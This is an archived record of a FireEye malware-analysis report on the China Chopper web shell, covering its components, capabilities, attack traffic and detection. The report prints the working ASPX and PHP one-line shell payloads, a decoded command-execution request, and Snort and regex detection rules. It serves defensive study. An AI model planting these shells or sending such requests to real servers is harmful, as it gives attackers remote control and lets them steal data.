{
    "id": "09f3d65e-2cb4-4ebc-90ac-b7670b879aa9",
    "created_at": "2022-10-25T16:48:20.054029Z",
    "updated_at": "2025-03-27T02:16:25.699693Z",
    "deleted_at": null,
    "sha1_hash": "eda271027851f85761cc18cfc766b99e298a28d8",
    "title": "",
    "authors": "",
    "file_creation_date": "2014-08-30T02:05:11Z",
    "file_modification_date": "2014-08-30T02:05:18Z",
    "file_size": 1480936,
    "plain_text": "## THE LITTLE MALWARE THAT COULD:\n\n### Detecting and Defeating the China Chopper Web Shell\n\n FireEye Labs\n\n Authors: Tony Lee, Ian Ahl and Dennis Hanzlik\n\n# SECURITY\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n## CONTENTS\n\n##### Introduction................................................................................................................................................................................................................................................................................................................................................3\n\n Components................................................................................................................................................................................................................................................................................................................................................3\n\n Capabilities....................................................................................................................................................................................................................................................................................................................................................8\n\n Payload Attributes..............................................................................................................................................................................................................................................................................................................12\n\n Platform........................................................................................................................................................................................................................................................................................................................................................... 15\n\n Delivery Mechanism.......................................................................................................................................................................................................................................................................................................17\n\n Traffic Analysis.............................................................................................................................................................................................................................................................................................................................. 17\n\n Detection...................................................................................................................................................................................................................................................................................................................................................... 22\n\n Conclusion................................................................................................................................................................................................................................................................................................................................................. 25\n\n About FireEye................................................................................................................................................................................................................................................................................................................................... 25\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n#### Introduction\nChina Chopper is an increasingly popular Web\nshell that packs a powerful punch into a small\npackage. In the space of just 4 kilobytes, the Web\nshell offers file and database management, code\nobfuscation, and more—all in an easy-to-use\ngraphical user interface that even novices can use.\n\nGiven its growing prevalence, especially among\nChinese cybercriminals, China Chopper warrants\nmuch more exposure than it has received to date.\nOutside of an insightful blog post from security\nresearcher Keith Tyler[1], little useful information\non China Chopper is publically available.\n\nTo contribute something new to the public\nknowledge base—especially for those who happen\nto find the China Chopper server-side payload on\none of their Web servers—FireEye studied the\ncomponents, capabilities, payload attributes, and\nthe detection rate of this 4 kilobyte menace.\n\n\nThis report describes the features that make\nChina Chopper an increasingly popular tool for\ncyber attackers. And more important, the report\nexplains how security professionals can better\ndetect the Web shell through network traffic and\non compromised systems.\n\n#### Components\nChina Chopper is a simple backdoor in terms of\ncomponents. It has two key components: the\nWeb shell command-and-control (CnC) client\nbinary and a text-based Web shell payload\n(server component). The text-based payload is so\nsimple and short that an attacker could type it by\nhand right on the target server—no file transfer\nneeded.\n\n**Web shell client**\nThe Web shell client was originally available on\nwww.maicaidao.com. FireEye advises against\nvisiting that site now.\n\n**Table 1: Original Web shell client**\nwith MD5 hash code\n\n|MD5 Hash|Malware Family|\n|---|---|\n|caidao.exe|5001ef50c7e869253a7c152a638eab8a|\n\n\n1 Tyler’s China Chopper post is available at http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nThe client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.\n\n**Figure 1: Client binary**\nviewed in WinHex\n\nThe executable file compressor UPX unpacks the binary to reveal details hidden by the packer.\n\n```\nC:\\Documents and Settings\\Administrator\\Desktop>upx -d\n5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe\nUltimate Packer for eXecutables\nCopyright (C) 1996 - 2011\nUPX 3.08w     Markus Oberhumer, Laszlo Molnar & John Reiser Dec\n12th 2011\nFile size      Ratio   Format    Name\n--------------------   ------  -----------  ----------700416 <-   220672  31.51%  win32/pe    decomp.exe\nUnpacked 1 file.\n\n```\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nPEiD (a free tool for detecting packers, cryptors, and compilers found in PE executable files),[2 ]reveals that\nthe unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.\n\n**Figure 2: PEiD reveals that the binary**\nwas written using Visual C++ 6.0\n\nBecause the strings are not encoded, examining them in the unpacked binary exposes how the backdoor\ncommunicates. Appearing in the strings are an intriguing reference to google.com.hk using the Chinese\n(simplified) language parameter (Figure 3) and references to the text “Chopper” (Figure 4).\n\n**Figure 2: Printable strings refer**\nto www.google.com.hk\n\n2 More information about PEiD is available at http://www.aldeid.com/wiki/PEiD.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**Figure 4: References to Chopper**\nin the client binary\n\nIn action, China Chopper is a menu-driven GUI full of convenient attack and “target-management”\nfeatures. When opened, the client displays example shell entries that point to www.maicaidao.com, which\noriginally hosted components of the Web shell.\n\n**Figure 5: Picture of the China**\nChopper Web shell interface\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**Server-side Payload Component**\nBut the client is only half of the remote access tool (RAT)—and not likely the part that would appear on a\ntargeted network. Its communication relies on a payload in the form of a small Web application. This payload\nis available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Table 2 shows some of the\noriginal files available for download shown with their MD5 hashes.\n\n**Web Shell Payload** **MD5 Hash**\n\n**Table 2: Original China Chopper**\n\nCustomize.aspx 8aa603ee2454da64f4c70f24cc0b5e08 files, with MD5 hash codes[3]\n\nCustomize.aspx ad8288227240477a95fb023551773c84\n\nCustomize.aspx acba8115d027529763ea5c7ed6621499\n\nEven though the MD5s are useful, this is a text-based payload that can be easily changed, resulting in a new\nMD5 hash. Here is an example of just one of China Chopper’s text-based payloads (for more details, see\n“Payload Attributes” on Page 11):\n\nASPX:\n\n|Web Shell Payload|MD5 Hash|\n|---|---|\n|Customize.aspx|8aa603ee2454da64f4c70f24cc0b5e08|\n|Customize.aspx|ad8288227240477a95fb023551773c84|\n|Customize.aspx|acba8115d027529763ea5c7ed6621499|\n\n```\n<%@ Page Language=”Jscript”%><%eval(RequestItem[“password”],”unsafe”)\n;%>Unpacked 1 file.\n\n```\n\nIn real-world use, “password” would be replaced with the actual password to be used in the client\ncomponent when connecting to the Web shell.\n\n3 Keith Tyler. “China Chopper Webshell - the 4KB that Owns your Web Server.” November 2012.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n#### Capabilities\nThe capabilities of both the payload and the client are impressive considering their size. The Web shell\nclient contains a “Security Scan” feature, independent of the payload, that gives the attacker the ability to\nspider and use brute-force password guessing against authentication portals.\n\n**Figure 6: China Chopper provides**\na “Security Scan” feature\n\nIn addition to vulnerability hunting, China Chopper has excellent CnC features when combining the client\nand payload, include the following:\n\n               - File Management (File explorer)\n\n               - Database Management (DB client)\n\n               - Virtual Terminal (Command shell)\n\nIn China Chopper’s main window, right-clicking one of the target URLs brings up a list of possible actions\n(see Figure 7).\n\n**Figure 7: Screenshot of the CnC**\nclient showing capabilities of\nthe Web shell\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**File Management**\nUsed as a RAT, China Chopper makes file management simple. Abilities include uploading and downloading\nfiles to and from the target, using the file-retrieval tool Wget[4 ]to download files from the Web to the target.\nAttackers can also edit, delete, copy, and rename files—and even change their time stamp.\n\n**Figure 8: File management**\nprovides an easy-to-use menu\nthat is activated by right-clicking\non a file name\n\nThe Modify the file time option is a surprisingly effective stealth technique. Figure 9 shows the time stamps\nof the three files in the test directory before the Web shell modifies the time stamps. By default, Windows\nExplorer shows only the “Date Modified” field. Without the time stamp change, the Web shell easily stands\nout because it is newer than the other two files.\n\n**Figure 9: IIS directory showing**\ntime stamps prior to the time\nmodification\n\n4 Wget is available at http://www.gnu.org/software/wget/.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nFigure 10 shows the date of the file after the Web shell modifies the time stamp. The “Date Modified” value\non the Web shell shows up as the same as the other two files. This is the default field displayed to users, so to\nthe untrained eye it easily blends in—especially with many files in the directory.\n\n**Figure 10: IIS directory showing**\ntime stamps after the time\nmodification\n\nClever investigators may think that they can spot the suspicious file due to the creation date being\nchanged to the same date as the modified date. But this is not necessarily anomalous. Additionally, even if\nthe file is detected, the forensic timeline is skewed because the date that the attacker planted the file is no\nlonger present. Finding the real date that the file was planted requires examining the Master File Table\n(MFT). After acquiring the MFT using FTK, EnCase, or other means, FireEye recommends using\nmftdump.[5 ]Written by FireEye researcher Mike Spohn, mftdump is a great tool for extracting and\nanalyzing file metadata.\n\nTable 3 shows the time stamps pulled from the MFT for our Web shell file before and after the time\nstamps were modified. The “fn*” fields retain their original times, so some useful information remains.\n\n**Category** **Pre-touch Match** **Post-touch Match**\n\nsiCreateTime (UTC) 6/6/2013 16:01 2/21/2003 22:48\n\nsiAccessTime (UTC) 6/20/2013 1:41 6/25/2013 18:56\n\nsiModTime (UTC) 6/7/2013 0:33 2/21/2003 22:48\n\nsiMFTModTime (UTC) 6/20/2013 1:54 6/25/2013 18:56\n\nfnCreateTime (UTC) 6/6/2013 16:01 6/6/2013 16:01\n\nfnAccessTime (UTC) 6/6/2013 16:03 6/6/2013 16:03\n\nfnModTime (UTC) 6/4/2013 15:42 6/4/2013 15:42\n\nfnMFTModTime (UTC) 6/6/2013 16:04 6/6/2013 16:04\n\n**Table 3: Time stamps from MFT**\n\n5 The mftdump tool is available at http://malware-hunters.net/all-downloads/.\n\n|Category|Pre-touch Match|Post-touch Match|\n|---|---|---|\n|siCreateTime (UTC)|6/6/2013 16:01|2/21/2003 22:48|\n|siAccessTime (UTC)|6/20/2013 1:41|6/25/2013 18:56|\n|siModTime (UTC)|6/7/2013 0:33|2/21/2003 22:48|\n|siMFTModTime (UTC)|6/20/2013 1:54|6/25/2013 18:56|\n|fnCreateTime (UTC)|6/6/2013 16:01|6/6/2013 16:01|\n|fnAccessTime (UTC)|6/6/2013 16:03|6/6/2013 16:03|\n|fnModTime (UTC)|6/4/2013 15:42|6/4/2013 15:42|\n|fnMFTModTime (UTC)|6/6/2013 16:04|6/6/2013 16:04|\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**Database Management**\nThe database management functionality is impressive and helpful to the first-time user. Upon configuring\nthe client, China Chopper provides example connection syntax.\n\n**Figure 11: Database management requires**\nsimple configuration parameters to connect\n\nAfter connecting, China Chopper also provides useful SQL commands.\n\n**Figure 12: China Chopper’s database**\nmanagement feature lets users interact\nwith a database and even provides helpful\nprepopulated commands\n\n**Command Shell Access**\nFinally, China Chopper provides command shell access for OS-level interaction, further\ndemonstrating its versatility.\n\n**Figure 12: Virtual terminal provides**\na command shell for OS interaction\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n#### Payload Attributes\nChina Chopper is stealthy due to a number of\nfactors, including the following:\n\n               - Size\n\n               - Server-side content\n\n               - Client-side content\n\n               - AV detection rate (or lack thereof)\n\n\n**Size**\nMalicious and benign software usually suffers\nfrom the same principle: more features equals\nmore code, which equals larger size.\nConsidering how many features China Chopper\noffers, it is incredibly small—just 73 bytes for\nthe ASPX version, or 4 kilobytes on disk (see\nFigure 14). Compare that to other Web shells\nsuch as Laudanum (619 bytes) or RedTeam\nPentesting (8,527 bytes). China Chopper is so\nsmall and simple that an attacker could\nconceivably type the contents of the shell by\nhand.\n\n**Figure 14: China**\nChopper file\nproperties\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**Server-Side Content**\nThe server-side content could easily be overlooked among the other files associated with a vanilla install\nof a complex application. The code does not look malicious—just odd.\n\n**Figure 15: Figure 15: The content of the file**\nseems relatively benign, especially if with a\nsafe-sounding word like “Security” as the shell\npassword\n\nBelow are the contents of the Web shell for two of its varieties.\n\nASPX\n\n```\n<%@ Page Language=”Jscript”%><%eval(RequestItem[“password”],”unsafe”);%>\n\n```\n\nPHP:\n\n```\n<?php @eval($_POST[‘password’]);?>\n\n```\n\n**Client-Side Content**\nBecause all of the code is server-side language that does not generate client-side code, browsing to the\nWeb shell and viewing the source as a client reveals nothing.\n\n**Figure 16: Viewing the source of the Web shell**\nreveals nothing to the client\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**Anti-Virus Detection Rate**\nRunning the Web shell through the virus-scanning website “No Virus Thanks” shows a detection rate of 0\nout of 14, indicating that most, if not all, anti-virus tools would miss the Web shell on an infected system.\n\n**Figure 17: Results of multiple anti-virus engine**\ninspections showing China Chopper coming up\nclean\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nThe same holds true for VirusTotal. None of its 47 anti-virus engines flags China Chopper as malicious.\n\n**Figure 18: Results of multiple AV engine**\ninspections showing the Web shell comes\nup clean\n\n#### Platform\nChina Chopper can run on any Web server capable of running JSP, ASP, ASPX, PHP, or CFM—the majority\nof Web application languages. China Chopper can also run transparently on both Windows and Linux.\nThis OS and application flexibility make China Chopper an even more dangerous Web shell.\n\n“Server-side Payload Component” on Page 5 showed China Chopper executing on a Windows 2003 IIS\nserver using ASPX. Figure 19 shows it running on Linux with PHP. Here, the contents of the PHP version\nare just as minimalistic..\n\n**Figure 19: This command is all that it takes**\nto run on Linux with PHP\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nWhile the available options differ depending on what platform China Chopper is running on, the file\nmanagement features in Linux (see Figure 20) are similar to those in Windows.\n\n**Figure 20: File browsing on a target system**\nrunning Linux\n\nThe database client example shown in Figure 21 is MySQL instead of MS-SQL, but it offers many of the\nsame capabilities.\n\n**Figure 21: Database management from a**\ntarget system running Linux\n\nThe virtual terminal looks familiar (Figure 22), but uses Linux commands instead of Windows because\nthey are ultimately interpreted by the underlying operating system.\n\n**Figure 22: Virtual terminal from a target**\nsystem running Linux\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n#### Delivery Mechanism\nChina Chopper’s delivery mechanism is flexible\ndue to the size, format, and simplicity of the\nmalware’s payload. This small, text-based payload\ncan be delivered using any of the following\nmechanisms:\n\n               - WebDAV file upload\n\n               - JBoss jmx-console or Apache Tomcat\nmanagement pages (For more details on this\nattack vector, read FireEye consultant Tony\nLee’s explanation)[6]\n\n               - Remote exploit with a file drop\n\n               - Lateral propagation from other access\n\n6 Tony Lee. “Manually Exploiting Tomcat Manager.” September 2012.\n\n\n#### Traffic Analysis\nAfter examining the server-side payload and the\nclient used to control the Web shell, the next step\nto understanding China Chopper is observing its\ntraffic. Having both the server and client\ncomponents enables researchers to start a packet\ncapture to view the contents of typical traffic. As\nshown in Figure 23, the client initiates the\nconnection over TCP port 80 using the HTTP\n_POST method._\n\n**Figure 23: A packet capture shows that the**\nWeb shell traffic is HTTP POST traffic over\nTCP port 80\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nBecause this is TCP traffic, researchers can “follow the TCP” stream in Wireshark, a popular open-source\nnetwork-protocol analyzer that works in Unix and Windows.[7] In Figure 24, the traffic in red at the top is\nfrom the attacker (Web client). The traffic shown in blue at the bottom is the response from the target\n(Web shell).\n\n**Figure 24: After following the TCP stream,**\nresearchers can see that the majority of the\nattacker traffic is Base64 encoded\n\n7 Wireshark is available at http://www.wireshark.org/.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nAs highlighted above, the majority of the attacker traffic appears to be Base64 encoded. This is not a\nproblem though, because it can be easily decoded. Using the “TextWizard” feature of the free Fiddler Web\ndebugger reveals what the attacker is sending.[8 ]\n\n(Note: %3D is a URL-encoded representation of the equal sign (“=”). Fiddler needs this to be converted to\nan equal sign for proper decoding.)\n\nRaw attacker traffic:\n\n```\nPassword=Response.Write(“->|”);\nvar err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).\nGetString(System. Convert.FromBase64String\n(“dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3R\nlbS5UZXh0LkVuY29kaW5n\nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc\n2U2NFN0cmluZyhSZXF1ZX\nN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXN\nzKCk7dmFyIG91dDpTeXN0\nZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTa\nGVsbEV4ZWN1dGU9ZmFsc2\nU7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJ\nyb3I9dHJ1ZTtlLlN0YXJ0\nSW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY\n29kaW5nKDY1MDAxKS5HZX\nRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1\nbInoyIl0pKTtlLlN0YXJ0\nKCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2Uo\nKTtSZXNwb25zZS5Xcml0ZS\nhvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D”)),”unsafe”);}\ncatch(err){Response.Write\n(“ERROR:// “%2Berr.message);}Response.Write(“|<-”);Response.\nEnd();&z1=Y21k&z2=Y2QgL2QgImM6\nXGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D\n\n```\n\n8 Fiddler is available at http://fiddler2.com/.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nAs shown In Figure 25, the Fiddler Web debugger text wizard easily converts the raw traffic from Base64\nto plain text.\n\n**Figure 25: Fiddler Web debugger decodes**\nthe Base64 traffic\n\nDecoded traffic:\n\n```\nvarc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.\nGetEncoding(65001).\nGetString(System.Convert.FromBase64String(Request.Item[“z1”])));\nvare=newSystem.Diagnostics.Process();\nvarout:System.IO.StreamReader,EI:System.IO.StreamReader;\nc.UseShellExecute=false;\nc.RedirectStandardOutput=true;c.RedirectStandardError=true;\ne.StartInfo=c;c.Arguments=”/c”+System.Text.Encoding.GetEncoding(65001).\nGetString(System.Convert.FromBase64String(Request.Item[“z2”]));\ne.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();\nResponse.Write(out.ReadToEnd()+EI.ReadToEnd());\n\n```\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nThe decoded traffic presents something more readable. But the Base64-decoded traffic shows an\nattempt to decode more Base64 traffic stored as “z1” and “z2.” The attacker traffic shows z1 and z2\nparameters immediately after the end of the “Password” parameter. The Base64-encoded parameters z1\nand z2 are highlighted in the following output:\n\n```\n&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ\njZCZlY2hvIFtFXQ%3D%3D\n\n```\n\nBase64-decoded parameters z1 and z2:\n\n```\nz1=cmdz2=cd /d “c:\\inetpub\\wwwroot\\”&whoami&echo [S]&cd&echo [E]\n\n```\n\nThis code explains how the client communicates with the shell. The “Password” parameter passes the\ncode to the payload to be executed. The z1 is cmd, and z2 contains the arguments to the command\nprompt sent via cmd /c. All output is sent to standard output (stdout) back to the attacker, which creates\nthe following response to the whoami command and the present working directory:\n\n```\n->|nt authority\\network service[S]C:\\Inetpub\\wwwroot[E]|<\n```\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n#### Detection\nUnderstanding the contents of China Chopper and what its traffic looks like allows researchers to detect\nthis pest both at the network and the host level.\n\n**Network**\nWith a standard Snort[9] IDS in place, this traffic can be caught with relative ease. Keith Tyler provides the\nfollowing basic IDS signature in his previously cited China Chopper blog post:[10]\n\n```\nalert tcp any any -> any 80 ( sid:900001; content:”base64_decode”;\nhttp_client_body;flow:to_server,established; content:”POST”; nocase;\nhttp_method; ;msg:”Webshell Detected Apache”;)\n\n```\n\nTo reduce false positives, tighten the Snort IDS signature to focus on China Chopper by looking for\ncontents of “FromBase64String” and “z1” as follows:\n\n```\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS\n(msg: “China Chopper with first Command Detected”;\nflow:to_server,established; content: “FromBase64String”;\ncontent: “z1”; content:”POST”; nocase;http_method;\nreference:url,http://www.fireeye.com/blog/technical/botnetactivitiesresearch/2013/08/\nbreaking-down-the-china-chopper-web-shell-part-i.html;\nclasstype:web-application-attack; sid: 900000101;)\n\n```\n\nBoth of these IDS signatures can be optimized further to factor depth and offset. Be sure to put a valid\nSID in before implementing and test the signature for performance.\n\n9 Snort is available at http://www.snort.org/.\n10 SKeith Tyler. “China Chopper Webshell - the 4KB that Owns your Web Server”. November 2012.\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n**Host**\nBecause the shells must contain a predictable syntax, researchers can quickly attempt to find files that\nhave that code in play.\n\nMany methods can be used to find files that contain China Chopper. The quickest and easiest method,\nespecially on a Linux machine, is probably using regular expressions. As shown in Figure 26, a quick egrep\nacross the Web directory can help identify infected files.\n\n```\negrep -re ‘ [<][?]php\\s\\@eval[(]\\$_POST\\[.+\\][)];[?][>]’ *.php\n\n```\n\n**Figure 26: Using egrep to find China**\nChopper\n\nAs shown in Figure 26, the egrep and regex commands are a powerful combination. While the regex\nsyntax may seem like gibberish, mastering it is not as difficult as it seems at first glance. Ian Ahl has\ncreated a few tutorials that can help improve researchers’ regex skills. Here are two to get started:\n\n- Regex basics (http://www.tekdefense.com/news/2012/10/21/tektip-ep12-regex-basics.html)\n\n- Using regex with Notepad (http://www.tekdefense.com/news/2013/1/6/tektip-ep19-using-regexwith-notepad.html)\n\nWindows also provides a way to search files using regular expressions with its native findstr command.\n\n\n**test.php:**\n\n\n**Figure 27: Using findstr to locate China**\nChopper\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\nThe command string differs from the regex equivalent. This was necessary to get around some of the\nways that findstr interprets regex.\n\nThe findstr command runs as follows:\n```\n             findstr /R “[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]” *.php\n\n```\nThese examples show detection in the PHP shell. To find the ASPX shell, modify the regex to fit the syntax\nof the ASPX shell as shown:\n```\n             egrep -re ‘[<]\\%\\@\\sPage\\sLanguage=.Jscript.\\%[>][<]\\%eval.Request\\.\n             Item.+unsafe’ *.aspx\n             findstr /R “[<]\\%\\@.Page.Language=.Jscript.\\%[>][<]\\%eval.Request\\.\n             Item.*unsafe” *.aspx\n\n```\nResearchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command\nwith some extended options to help identify Web files to run the regex command against (see Figure 28).\n```\n             dir /S /A /B *.php\n\n```\n**Figure 28: Recursive search through**\nWindows using the dir command\n\n_Findstr also has an option to search all subdirectories (see Figure 29), as follows:_\n```\n             findstr /R /S “[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]” *.php\n\n```\n**Figure 29: Using findstr to recursively locate**\nmultiple instances of the Web shell\n\n\n-----\n\n**The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell**\n\n#### Conclusion\nArmed with knowledge about China Chopper’s\nfeatures, platform versatility, delivery\nmechanisms, traffic analysis, and detection—along\nwith a few free software tools—researchers can\nbegin eradicating this elegantly designed but\ndangerous menace.\n\nTo learn more about how FireEye can help your\norganization find China Chopper and other\nadvanced malware, visit www.fireeye.com.\n\n\n#### About FireEye\nFireEye has invented a purpose-built, virtual\nmachine-based security platform that provides\nrealtime threat protection to enterprises and\ngovernments worldwide against the next\ngeneration of cyber attacks. These highly\nsophisticated cyber attacks easily circumvent\ntraditional signature-based defenses, such as\nnext-generation firewalls, IPS, anti-virus, and\ngateways. The FireEye Threat Prevention\nPlatform™ provides real-time, dynamic threat\nprotection without the use of signatures to\nprotect an organization across the primary threat\nvectors, including Web, email, and files and across\nthe different stages of an attack life cycle. The\ncore of the FireEye platform is a virtual execution\nengine, complemented by dynamic threat\nintelligence, to identify and block cyber attacks in\nreal time. FireEye has over 1,100 customers\nacross more than 40 countries, including over 100\nof the Fortune 500.\n\n\nFireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com\n\n© 2014 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye,\nI All th b d d t i b t d k i\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.00.00.China_Chopper_Web_Shell/rpt-china-chopper.pdf"
    ],
    "report_names": [
        "rpt-china-chopper"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1409364311,
    "ts_modification_date": 1409364318,
    "files": {
        "pdf": "https://archive.orkl.eu/eda271027851f85761cc18cfc766b99e298a28d8.pdf",
        "text": "https://archive.orkl.eu/eda271027851f85761cc18cfc766b99e298a28d8.txt",
        "img": "https://archive.orkl.eu/eda271027851f85761cc18cfc766b99e298a28d8.jpg"
    }
}